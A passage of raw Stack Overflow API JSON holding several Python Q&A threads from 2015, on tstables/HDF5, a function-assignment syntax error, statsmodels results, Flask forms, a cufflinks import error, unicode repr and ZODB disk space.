rel=\"nofollow\">group.py</a>:</p>\n\n<pre><code>tstables.get_timeseries(f.root.BPI)\n</code></pre>\n\n<p>where <code>f</code> is the file handler to HDF5 file produced in that <a href=\"https://github.com/afiedler/tstables/blob/master/EXAMPLES.md#load-one-month-of-minutely-bitcoin-price-data\" rel=\"nofollow\">BPI example</a>.</p>\n"}], "owner": {"reputation": 141, "user_id": 2731801, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/0d4688d0aa476279f88f6a623878e910?s=128&d=identicon&r=PG&f=1", "display_name": "Pavel", "link": "https://stackoverflow.com/users/2731801/pavel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 604, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1428191045, "creation_date": 1427924975, "question_id": 29401457, "link": "https://stackoverflow.com/questions/29401457/appending-time-series-to-existing-hdf5-file-with-tstables", "title": "Appending time series to existing HDF5-file with tstables", "body": "<p>Running <a href=\"https://github.com/afiedler/tstables/blob/master/EXAMPLES.md#load-one-month-of-minutely-bitcoin-price-data\" rel=\"nofollow\">TsTables example</a> once: everything works. Running second time:</p>\n\n<p><strong>tables.exceptions.NodeError: group <code>/</code> already has a child node named <code>BPI</code></strong></p>\n\n<p>Makes sense, can not do</p>\n\n<pre><code>ts = f.create_ts('/','BPI',BpiValues)\n</code></pre>\n\n<p>since the corresponding node/leaf already exists in the HDF5 tree.</p>\n\n<p><strong>Question</strong>: how should <code>TsTable</code> class be instantiated from a group that already exists? Doing <code>.getNode('/', 'BPI')</code> on file handler returns a group, not a table.</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 2, "creation_date": 1427924816, "post_id": 29401376, "comment_id": 46978445, "body": "What&#39;s to explain? You can&#39;t assign to a function call. If you&#39;re trying to <b><i>define</i></b> a function, use <code>def</code> or <code>lambda</code>."}, {"owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "edited": false, "score": 0, "creation_date": 1427924848, "post_id": 29401376, "comment_id": 46978451, "body": "What is <code>F</code>? It&#39;s not clear what you&#39;re trying to do."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427924957, "post_id": 29401376, "comment_id": 46978489, "body": "what is <code>self.F(x)</code>?"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427925024, "post_id": 29401376, "comment_id": 46978521, "body": "I think it&#39;s a result of confusion about variable names, <code>self</code>, and functions."}], "answers": [{"tags": [], "owner": {"reputation": 10366, "user_id": 236195, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/53fd77df3990f126c69fb6ec4e0ea6de?s=128&d=identicon&r=PG", "display_name": "frnhr", "link": "https://stackoverflow.com/users/236195/frnhr"}, "is_accepted": false, "score": 2, "last_activity_date": 1427924924, "creation_date": 1427924924, "answer_id": 29401445, "question_id": 29401376, "link": "https://stackoverflow.com/questions/29401376/cant-assign-to-function-call-python/29401445#29401445", "title": "Can&#39;t Assign to Function Call (Python)", "body": "<p>It is not clear (to me at least) what it is you're trying to achieve, but perhaps it is as simple as this:</p>\n\n<pre><code>def F(self, x):\n    return self.a * (x ** 2) + self.b * x + c\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 1, "last_activity_date": 1427924972, "creation_date": 1427924972, "answer_id": 29401456, "question_id": 29401376, "link": "https://stackoverflow.com/questions/29401376/cant-assign-to-function-call-python/29401456#29401456", "title": "Can&#39;t Assign to Function Call (Python)", "body": "<p>As you might have guessed, <code>F(x)</code> is a function call. You're calling the function <code>F</code>, which does not actually exist, passing it the argument <code>x</code>, which does not actually exist either. You need to give your variables legal names, like <code>f_of_x</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 9227, "user_id": 1830895, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/I8Hvh.jpg?s=128&g=1", "display_name": "Pynchia", "link": "https://stackoverflow.com/users/1830895/pynchia"}, "is_accepted": false, "score": 1, "last_activity_date": 1427925201, "creation_date": 1427925201, "answer_id": 29401509, "question_id": 29401376, "link": "https://stackoverflow.com/questions/29401376/cant-assign-to-function-call-python/29401509#29401509", "title": "Can&#39;t Assign to Function Call (Python)", "body": "<p>try with:</p>\n\n<pre><code>def __init__(self, a,b,c):\n    self.a = a\n    self.b = b\n    self.c = c\n    self.F = lambda x: a*(x**2)+b*x+c\n</code></pre>\n\n<p>and discard the function() method</p>\n"}], "owner": {"reputation": 575, "user_id": 1558075, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/ffa1f9fdcc9f3d9b0819c2487e1fdd02?s=128&d=identicon&r=PG", "display_name": "DeeWBee", "link": "https://stackoverflow.com/users/1558075/deewbee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2119, "favorite_count": 0, "answer_count": 3, "score": -3, "last_activity_date": 1427928856, "creation_date": 1427924576, "last_edit_date": 1427928856, "question_id": 29401376, "link": "https://stackoverflow.com/questions/29401376/cant-assign-to-function-call-python", "title": "Can&#39;t Assign to Function Call (Python)", "body": "<p>I have the following code:</p>\n\n<pre><code>class Quadratic:\n\n    def __init__(self, a, b, c):\n        self.a = a\n        self.b = b\n        self.c = c\n\n    def function(self, x):\n        self.F(x) = a*(x**2) + b*x + c\n        return F(x)\n\n    def table(self, lower, upper, varz):\n        inc = np.absolute(upper-lower) / varz\n        print inc\n        for i in range(0 , varz - 1):\n            self.F(lower)\n            lower = lower + inc\n        #lower bound,upper bound, number of values\n\n    def roots():\n        x1 = (-b + math.sqrt(b**2 - 4*a*c)) / (2*a)\n        x2 = (-b - math.sqrt(b**2 - 4*a*c)) / (2*a)\n        return x1, x2\n\n    def dump(self):\n        print self.n\n</code></pre>\n\n<p>Whenever I try and run this script, I get the following:</p>\n\n<pre><code>line 15\nself.F(x) = a*(x**2) + b*x + c\nSyntaxError: can't assign to function call\n</code></pre>\n\n<p>Any help or ideas would be greatly appreciated.</p>\n"}, {"tags": ["python", "pandas", "statsmodels"], "answers": [{"comments": [{"owner": {"reputation": 1549, "user_id": 3302563, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/noftk.jpg?s=128&g=1", "display_name": "Diego Aguado", "link": "https://stackoverflow.com/users/3302563/diego-aguado"}, "edited": false, "score": 0, "creation_date": 1427925023, "post_id": 29401453, "comment_id": 46978519, "body": "Still figuring out the R squared"}], "tags": [], "owner": {"reputation": 1549, "user_id": 3302563, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/noftk.jpg?s=128&g=1", "display_name": "Diego Aguado", "link": "https://stackoverflow.com/users/3302563/diego-aguado"}, "is_accepted": true, "score": 1, "last_activity_date": 1427925980, "last_edit_date": 1427925980, "creation_date": 1427924956, "answer_id": 29401453, "question_id": 29401356, "link": "https://stackoverflow.com/questions/29401356/how-to-save-in-a-variable-significance-of-a-coefficient-estimated-by-ols-using-s/29401453#29401453", "title": "How to save in a variable significance of a coefficient estimated by OLS using statsmodels in python?", "body": "<p>Oh, I managed to answer my own question.\nYou just have to go ahead and do the following:</p>\n\n<pre><code>print result.pvalue\nprint result.conf_int()\nprint result.rsquared\n</code></pre>\n"}], "owner": {"reputation": 1549, "user_id": 3302563, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/noftk.jpg?s=128&g=1", "display_name": "Diego Aguado", "link": "https://stackoverflow.com/users/3302563/diego-aguado"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 775, "favorite_count": 0, "accepted_answer_id": 29401453, "answer_count": 1, "score": 0, "last_activity_date": 1427925980, "creation_date": 1427924470, "question_id": 29401356, "link": "https://stackoverflow.com/questions/29401356/how-to-save-in-a-variable-significance-of-a-coefficient-estimated-by-ols-using-s", "title": "How to save in a variable significance of a coefficient estimated by OLS using statsmodels in python?", "body": "<p>I performed a linear regression(OLS) using statsmodels.formula.api and showing the paramenters and summary the following way:</p>\n\n<pre><code> result = sm.ols(formula=\"items ~ views + price\", data=nvo).fit()\n print result.params\n</code></pre>\n\n<p>This is very usefull but I would like to save the significance of a the coefficient of price in a variable, how can I acces the elements of the summary object? Specificly how can I save the R squared, significance and the confidence interval?</p>\n"}, {"tags": ["python", "flask"], "answers": [{"comments": [{"owner": {"reputation": 809, "user_id": 4423745, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Q8i75.png?s=128&g=1", "display_name": "kwn", "link": "https://stackoverflow.com/users/4423745/kwn"}, "edited": false, "score": 1, "creation_date": 1427967013, "post_id": 29401710, "comment_id": 46992417, "body": "Thanks it worked! I had another bug because of the type of  <code>request.form[&#39;depth&#39;]</code> but a cast solved it."}], "tags": [], "owner": {"reputation": 4979, "user_id": 2676531, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc88aa76113d738e11685389a1409a26?s=128&d=identicon&r=PG", "display_name": "Celeo", "link": "https://stackoverflow.com/users/2676531/celeo"}, "is_accepted": true, "score": 0, "last_activity_date": 1427926065, "creation_date": 1427926065, "answer_id": 29401710, "question_id": 29401325, "link": "https://stackoverflow.com/questions/29401325/how-to-call-a-different-render-after-a-form-submission/29401710#29401710", "title": "How to call a different render after a form submission", "body": "<p>In your <code>main</code> method, unless values is global, it won't be defined for <code>if not values</code>.</p>\n\n<p>As to your question, add another <code>render_template</code> call just after the conditional for if the form was submitted:</p>\n\n<pre><code>if request.method=='POST':\n    url = request.form['url']\n    maxDepth = request.form['depth']\n    numberOfRelated = request.form['numberOfRelated']\n    values = crawling(url,maxDepth,numberOfRelated)\n    return render_template('index.html',var=values) # 1\nreturn render_template('index.html',var=values) # 2\n</code></pre>\n\n<p>If the form is submitted, the conditional will be true and the template will be rendered at comment <code>#1</code>. If the user is navigating to the page normally, the conditional will be false and the line with comment <code>#2</code> will be called.</p>\n"}, {"tags": [], "owner": {"reputation": 3125, "user_id": 84007, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/5f8dfb1530475449020d465b94031150?s=128&d=identicon&r=PG", "display_name": "Jonatan", "link": "https://stackoverflow.com/users/84007/jonatan"}, "is_accepted": false, "score": 0, "last_activity_date": 1427963432, "creation_date": 1427963432, "answer_id": 29408411, "question_id": 29401325, "link": "https://stackoverflow.com/questions/29401325/how-to-call-a-different-render-after-a-form-submission/29408411#29408411", "title": "How to call a different render after a form submission", "body": "<p>I'm a bit confused about the question, but you should always redirect after a POST (unless there was an error in the form and no action was taken). That way the same action won't be repeated if the user reloads the page.</p>\n"}], "owner": {"reputation": 809, "user_id": 4423745, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/Q8i75.png?s=128&g=1", "display_name": "kwn", "link": "https://stackoverflow.com/users/4423745/kwn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 639, "favorite_count": 0, "accepted_answer_id": 29401710, "answer_count": 2, "score": 0, "last_activity_date": 1427963432, "creation_date": 1427924338, "question_id": 29401325, "link": "https://stackoverflow.com/questions/29401325/how-to-call-a-different-render-after-a-form-submission", "title": "How to call a different render after a form submission", "body": "<p>I'm diving into Flask for the first time and I'm having some trouble getting something work. </p>\n\n<p>I currently have a  template for when my tab <code>values</code> is empty, it contains a form that when submitted should call a specific function using the parameters of the form and return another template. Each call of the form should in, fact call the <code>index.html</code> template with different values.</p>\n\n<p>Relevant parts of code are as follows:</p>\n\n<p><code>main.py</code></p>\n\n<pre><code>@app.route('/', methods=['POST','GET'])\ndef main():\n\n    global maxDepth, numberOfRelated\n\n    if not values:\n        return render_template('initial.html')\n\n    if request.method=='POST':\n        url = request.form['url']\n        maxDepth = request.form['depth']\n        numberOfRelated = request.form['numberOfRelated']\n\n        values = crawling(url,maxDepth,numberOfRelated)\n\n        return render_template('index.html',var=values)\n</code></pre>\n\n<p>The form part of <code>initial.html</code> and <code>index.html</code> are actually the same</p>\n\n<pre><code>&lt;form class=\"form-inline\" action=\"/\" method=\"POST\"&gt;\n              &lt;div class=\"form-group\"&gt;\n                &lt;input  name='url' type=\"text\" class=\"form-control\"/&gt;\n              &lt;/div&gt;             \n               &lt;div class=\"form-group minorForm\"&gt;\n                &lt;input  name='numberOfRelated' type=\"text\" class=\"form-control\" /&gt;\n              &lt;/div&gt;\n              &lt;div class=\"form-group minorForm\"&gt;\n                  &lt;input  name='depth' type=\"text\" class=\"form-control\" /&gt;\n              &lt;/div&gt;\n              &lt;div class=\"form-group navbar-right\"&gt;\n                &lt;button class=\"btn btn-success minorForm generate\" type=\"submit\"&gt; Generate&lt;/button&gt;\n              &lt;/div&gt; \n   &lt;/form&gt;\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "ipython", "visualization", "plotly"], "comments": [{"owner": {"reputation": 829, "user_id": 3557327, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/ff2c9f3eb0de137929fd3893d62b044c?s=128&d=identicon&r=PG&f=1", "display_name": "user3557327", "link": "https://stackoverflow.com/users/3557327/user3557327"}, "edited": false, "score": 0, "creation_date": 1427924369, "post_id": 29401260, "comment_id": 46978283, "body": "Try opening a console and <code>import cufflinks.plotlytools</code>"}, {"owner": {"reputation": 24570, "user_id": 2272172, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/40d9cf17504d06006a0154ef0b332457?s=128&d=identicon&r=PG&f=1", "display_name": "cel", "link": "https://stackoverflow.com/users/2272172/cel"}, "edited": false, "score": 0, "creation_date": 1427957638, "post_id": 29401260, "comment_id": 46987892, "body": "Why is <code>lib</code> capitalized in the path you manually checked?"}, {"owner": {"reputation": 834, "user_id": 3233870, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6j0JU.jpg?s=128&g=1", "display_name": "BCR", "link": "https://stackoverflow.com/users/3233870/bcr"}, "reply_to_user": {"reputation": 24570, "user_id": 2272172, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/40d9cf17504d06006a0154ef0b332457?s=128&d=identicon&r=PG&f=1", "display_name": "cel", "link": "https://stackoverflow.com/users/2272172/cel"}, "edited": false, "score": 0, "creation_date": 1427982620, "post_id": 29401260, "comment_id": 47001749, "body": "import cufflinks.plotlytools produces the same error. @cel I&#39;m not sure why <code>Lib</code> is capitalized. Could be a <code>WinPython</code> thing but it hasn&#39;t affected the use of any other packages."}], "answers": [{"tags": [], "owner": {"reputation": 834, "user_id": 3233870, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6j0JU.jpg?s=128&g=1", "display_name": "BCR", "link": "https://stackoverflow.com/users/3233870/bcr"}, "is_accepted": true, "score": 1, "last_activity_date": 1428172180, "last_edit_date": 1428172180, "creation_date": 1428032109, "answer_id": 29425836, "question_id": 29401260, "link": "https://stackoverflow.com/questions/29401260/importerror-no-module-named-plotlytools-when-importing-cufflinks/29425836#29425836", "title": "ImportError No module named &#39;plotlytools&#39; when importing Cufflinks", "body": "<p>I was able to import the module after implementing the following workarounds:</p>\n\n<ol>\n<li>In the <code>utils.py</code> file I added <code>()</code> to all the <code>print</code> statements, example: <code>print 'string'</code> became <code>print('string')</code>.</li>\n<li>I copied then deleted the <code>utils.py</code> and <code>colors.py</code> files and pasted the contents into the <code>plotlytools.py</code> file. </li>\n<li>I updated all the import references in the remaining files.</li>\n<li>to use the pandastools functionality, specifically the <code>df.iplot</code> method, it was also necessary to update the encoding and decoding methods for the <code>colors.py</code> file from <code>str.encode('hex') and str.decode('hex')</code> to <code>import codecs; codecs.encode(str,'hex'); codecs.decode(str,'hex')</code></li>\n<li>I also updated the generator methods from <code>gen_object.next()</code> to <code>next(gen_object)</code></li>\n</ol>\n\n<p>At this point all the functionality of the module seems to be restored.</p>\n"}], "owner": {"reputation": 834, "user_id": 3233870, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6j0JU.jpg?s=128&g=1", "display_name": "BCR", "link": "https://stackoverflow.com/users/3233870/bcr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1998, "favorite_count": 0, "accepted_answer_id": 29425836, "answer_count": 1, "score": 0, "last_activity_date": 1428172180, "creation_date": 1427924048, "last_edit_date": 1427983283, "question_id": 29401260, "link": "https://stackoverflow.com/questions/29401260/importerror-no-module-named-plotlytools-when-importing-cufflinks", "title": "ImportError No module named &#39;plotlytools&#39; when importing Cufflinks", "body": "<p>My system environment: <code>Windows 8.1, WinPython 3.4.3.1, pandas 0.16, plotly 1.6.14, cufflinks 0.2</code></p>\n\n<p>I have no idea what's causing the issue. I'm attempting to use the tutorial outlined here <a href=\"http://nbviewer.ipython.org/gist/santosjorge/cfaaf43b40db19d6127a\" rel=\"nofollow noreferrer\" title=\"cufflinks nbviewer\">cufflinks nbviewer tutorial</a> </p>\n\n<p>However when I try to import the cufflinks module I get the following output.</p>\n\n<p><img src=\"https://i.stack.imgur.com/IsOyZ.png\" alt=\"enter image description here\"></p>\n\n<p>That doesn't make sense to me because as far as I can tell the files are all set up correctly within the folder and I don't see any obvious errors within the files themselves. See below image:</p>\n\n<p><img src=\"https://i.stack.imgur.com/qyPBY.png\" alt=\"enter image description here\"></p>\n\n<p>I also looked at the <code>__init__.py</code> file and didn't see anything unusual.</p>\n\n<p><img src=\"https://i.stack.imgur.com/OD0qX.png\" alt=\"enter image description here\"></p>\n\n<p>And lastly I looked at the actual <code>plotlytools.py</code> file to see if anything looked odd and nothing jumped out at me.</p>\n\n<p><img src=\"https://i.stack.imgur.com/dAs1P.png\" alt=\"enter image description here\"></p>\n\n<p>Any help figuring this one out would be greatly appreciated. Thanks.</p>\n\n<p>UPDATE: If this helps here is a print out of my <code>sys.path</code></p>\n\n<p><img src=\"https://i.stack.imgur.com/E0F4e.png\" alt=\"enter image description here\"></p>\n"}, {"tags": ["python", "unicode"], "answers": [{"tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": true, "score": 2, "last_activity_date": 1427924477, "last_edit_date": 1427924477, "creation_date": 1427924157, "answer_id": 29401285, "question_id": 29401259, "link": "https://stackoverflow.com/questions/29401259/unicode-vs-unicode-representation/29401285#29401285", "title": "Unicode vs Unicode representation", "body": "<p>You want to use <a href=\"https://docs.python.org/2/library/functions.html#func-repr\" rel=\"nofollow\">repr</a>:</p>\n\n<pre><code>print repr(u)\n</code></pre>\n\n<p><code>print u'\u00e9'</code> in a shell gives you the <code>str</code> output, <code>u'\u00e9'</code> in the shell shows you the <code>repr</code> output.</p>\n\n<p><a href=\"https://docs.python.org/2/library/functions.html#str\" rel=\"nofollow\">str</a></p>\n\n<blockquote>\n  <p>Return a string containing a nicely printable representation of an object. For strings, this returns the string itself. The difference with repr(object) is that str(object) does not always attempt to return a string that is acceptable to eval(); its goal is to return a printable string. If no argument is given, returns the empty string, ''.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 43245, "user_id": 699305, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/db6ce45b5ec86e1b00d922fc5cee315f?s=128&d=identicon&r=PG", "display_name": "alexis", "link": "https://stackoverflow.com/users/699305/alexis"}, "is_accepted": false, "score": 0, "last_activity_date": 1427967439, "creation_date": 1427967439, "answer_id": 29409635, "question_id": 29401259, "link": "https://stackoverflow.com/questions/29401259/unicode-vs-unicode-representation/29409635#29409635", "title": "Unicode vs Unicode representation", "body": "<p><code>repr()</code> will only work on python 2 (which is clearly what you're using). Here's a more complete answer, and a recommendation: <strong>If you'll be working with unicode, switch to python 3 if at all possible.</strong> There's no good reason to try to make sense of how python 2 handles text encodings, when the improvements in python 3 are one of the major reasons it exists.</p>\n\n<blockquote>\n  <p>What's the difference between the two:</p>\n\n<pre><code>u'\u00e9' \nu'\\xe9' \n</code></pre>\n</blockquote>\n\n<p>These are two ways to specify the same string to python; there <em>is</em> no difference in the content of these two strings: </p>\n\n<pre><code>&gt;&gt;&gt; u'\u00e9' == u'\\xe9'\nTrue\n</code></pre>\n\n<p>Just like the byte with value 62 is <code>A</code> in ascii (<code>chr(62) == \"A\"), unicode characters have a (usually) 16-bit value that is conventionally written in hexadecimal. For a single-character, you could display this value in decimal with</code>ord()` (though that's not too useful).</p>\n\n<p>When you print your string, python will try to display it. When you convert it with <code>repr()</code>, python will show you the character itself or an escaped form, depending on whether it could be used in a literal string. In python 3, <code>repr('\u00e9')</code> is just <code>'\u00e9'</code> since it can appear in string literals. To see your text as a sequence of 16-bit unicode codepoints, you should do this (works in python 2 or 3):</p>\n\n<pre><code>&gt;&gt;&gt; text = u'e'\n&gt;&gt;&gt; print(text.encode(\"raw_unicode_escape\"))\nb'\\xe9'\n</code></pre>\n\n<p>Here's a longer example (on python 3):</p>\n\n<pre><code>&gt;&gt;&gt; text = \"ne\u00e9\"\n&gt;&gt;&gt; repr(text)\n\"'ne\u00e9'\"\n&gt;&gt;&gt; text.encode(\"raw_unicode_escape\")\nb'ne\\xe9'\n&gt;&gt;&gt; text.encode(\"utf-8\")\nb'ne\\xc3\\xa9'\n</code></pre>\n\n<p>Note that UTF-8 encodes <code>\u00e9</code> as a two-byte sequence. UTF-8 is just an encoding, the codepoint for this character is <code>U+00e9</code>.</p>\n"}], "owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 107, "favorite_count": 0, "accepted_answer_id": 29401285, "answer_count": 2, "score": 2, "last_activity_date": 1427967439, "creation_date": 1427924043, "question_id": 29401259, "link": "https://stackoverflow.com/questions/29401259/unicode-vs-unicode-representation", "title": "Unicode vs Unicode representation", "body": "<p>I'm a bit confused as to what the difference is between the unicode character and the representation of that character. What is the difference between the two:</p>\n\n<pre><code>&gt;&gt;&gt; u'\u00e9'\n&gt;&gt;&gt; u'\\xe9'\n</code></pre>\n\n<p>In addition, how would I be able to go back-and-forth between the 'readable' unicode (\u00e9) and the machine unicode(\\xe9)? How would I do this for the following?</p>\n\n<pre><code>&gt;&gt;&gt; u='bj\\\\u00f6rk: voltaic'\n&gt;&gt;&gt; print u\nbj\\u00f6rk: voltaic\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "zope", "zodb"], "answers": [{"comments": [{"owner": {"reputation": 17930, "user_id": 1575066, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/hGOuL.png?s=128&g=1", "display_name": "PascalVKooten", "link": "https://stackoverflow.com/users/1575066/pascalvkooten"}, "edited": false, "score": 0, "creation_date": 1427924946, "post_id": 29401338, "comment_id": 46978483, "body": "Btw, I&#39;m maintaining a list that I share among threads. It&#39;s really simple with ZODB, but this list changes a lot. Considering this append-only situation, do you perhaps some advice for that (probably that it is not a good idea)?"}, {"owner": {"reputation": 68601, "user_id": 315168, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=128&d=identicon&r=PG", "display_name": "Mikko Ohtamaa", "link": "https://stackoverflow.com/users/315168/mikko-ohtamaa"}, "reply_to_user": {"reputation": 17930, "user_id": 1575066, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/hGOuL.png?s=128&g=1", "display_name": "PascalVKooten", "link": "https://stackoverflow.com/users/1575066/pascalvkooten"}, "edited": false, "score": 0, "creation_date": 1427927624, "post_id": 29401338, "comment_id": 46979536, "body": "ZODB should not be problem for most of use cases - if you are using native ZODB lists then it should write only the delta to the database on each update (though I need to confirm that). Please see <a href=\"http://zodborg.readthedocs.org/en/latest/documentation/guide/modules.html#persistent-list-persistentlist\" rel=\"nofollow noreferrer\">zodborg.readthedocs.org/en/latest/documentation/guide/&hellip;</a> - use PersistentList instead of []. This is how ZODB works - you really can&#39;t change the nature of the beast. If you need to deal with large, mutable, blobs I suggest you consider alternative databases. Here is one approach for ZODB like behavior on PostgreSQL <a href=\"https://github.com/Shoobx/pjpersist\" rel=\"nofollow noreferrer\">github.com/Shoobx/pjpersist</a>"}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 17930, "user_id": 1575066, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/hGOuL.png?s=128&g=1", "display_name": "PascalVKooten", "link": "https://stackoverflow.com/users/1575066/pascalvkooten"}, "edited": false, "score": 0, "creation_date": 1427967028, "post_id": 29401338, "comment_id": 46992425, "body": "@PascalvKooten: there are ZODB backends that can be configured to discard historical revisions; <code>RelStorage</code> can do this. The default <code>FileStorage</code> backend however cannot."}], "tags": [], "owner": {"reputation": 68601, "user_id": 315168, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=128&d=identicon&r=PG", "display_name": "Mikko Ohtamaa", "link": "https://stackoverflow.com/users/315168/mikko-ohtamaa"}, "is_accepted": false, "score": 2, "last_activity_date": 1427924382, "creation_date": 1427924382, "answer_id": 29401338, "question_id": 29401207, "link": "https://stackoverflow.com/questions/29401207/zodb-does-not-release-hard-disk-space/29401338#29401338", "title": "ZODB does not release hard-disk space", "body": "<p>ZODB is append-only database. ZODB never reclaims or overwrites old information unless explicitly told to do so. This means that you have infinite undo history to the point the database was created if needed.</p>\n\n<p>To reclaim the disk space you need to <a href=\"http://docs.plone.org/develop/plone/persistency/database.html#packing-database\" rel=\"nofollow\">pack ZODB database</a>.</p>\n\n<p>Other databases (MySQL, PostgreSQL) have similar characteristics. For example, PostgreSQL must be <code>VACUUM</code>ed time to time.</p>\n"}], "owner": {"reputation": 17930, "user_id": 1575066, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/hGOuL.png?s=128&g=1", "display_name": "PascalVKooten", "link": "https://stackoverflow.com/users/1575066/pascalvkooten"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 191, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1427924382, "creation_date": 1427923835, "question_id": 29401207, "link": "https://stackoverflow.com/questions/29401207/zodb-does-not-release-hard-disk-space", "title": "ZODB does not release hard-disk space", "body": "<p>I tested ZODB by creating a huge object, committed, then it gave a warning. \nNext, I proceeded to delete the object from root, commit. The .fs file was still 1GB in space. I then killed the REPL. I reopened python, made the connection, but now I cannot seem to get rid of this 1 GB file (other than trying to delete it from the disk itself).</p>\n\n<p>Code something like:</p>\n\n<pre><code>storage = FileStorage('Data.fs')\ndb = DB(storage)\nconnection = db.open()\nroot = connection.root()\n</code></pre>\n\n<p>Followed by creating some huge object and at first I actually did</p>\n\n<pre><code>root['bigObj'] = 'small_str',\ntransaction.commit()\n</code></pre>\n\n<p>to try and overwrite. After which I just deleted the key/value.</p>\n\n<p>What part am I missing?</p>\n"}, {"tags": ["python", "search", "python-sphinx", "ellipsis"], "comments": [{"owner": {"reputation": 1237, "user_id": 1449189, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/63597c2cbc3457b3c8cb34d492c52522?s=128&d=identicon&r=PG", "display_name": "tbhartman", "link": "https://stackoverflow.com/users/1449189/tbhartman"}, "edited": false, "score": 0, "creation_date": 1483131697, "post_id": 29401201, "comment_id": 70007692, "body": "Same thing is happening for me.  Check your browser console for javascript errors.  I see that &quot;searchtools.js&quot; is failing because &quot;DOCUMENTATION_OPTIONS&quot; does not have a &quot;SOURCELINK_SUFFIX&quot; property...trying to figure out how to fix that."}], "answers": [{"tags": [], "owner": {"reputation": 815, "user_id": 1066801, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/1cd721ca93dac6dd0c9ce1376607fd38?s=128&d=identicon&r=PG", "display_name": "M07", "link": "https://stackoverflow.com/users/1066801/m07"}, "is_accepted": false, "score": 0, 